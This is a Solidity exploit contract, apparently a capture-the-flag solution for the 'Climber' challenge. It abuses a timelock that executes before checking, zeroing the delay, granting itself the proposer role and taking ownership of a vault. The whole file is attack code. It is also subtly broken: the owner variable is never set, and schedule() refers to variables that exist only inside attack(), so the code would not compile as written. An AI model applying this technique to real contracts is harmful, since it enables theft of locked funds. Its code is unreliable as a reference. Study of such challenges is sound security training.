// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract AttackClimber {
    address private owner;
    IClimberTimelock private climberTimelock;
    address private vault;

    constructor(address _climberTimelock, address _vault) {
        climberTimelock = IClimberTimelock(_climberTimelock);
        vault = _vault;
    }

    function attack() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = bytes32(uint256(1));

        //Reduce timelock deplay to 0
        targets[0] = address(climberTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        //Grant proposer role to this contract
        targets[1] = address(climberTimelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        //Tranfer ownership of ClimberVault to this contract
        targets[2] = vault;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            owner
        );

        /**
        Schedule the above actions in the timelock to pass the require statement of execute,
        schedule cannot be called directly, as dataElements would have to contain
        schedule which would have to contain schedule again.
        Instead make a call to a method on this contract called schedule()
        which will properly call schedule on the timelock
         */
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        //Exexute the tasks setup above
        climberTimelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        climberTimelock.schedule(targets, values, dataElements, salt);
    }
}
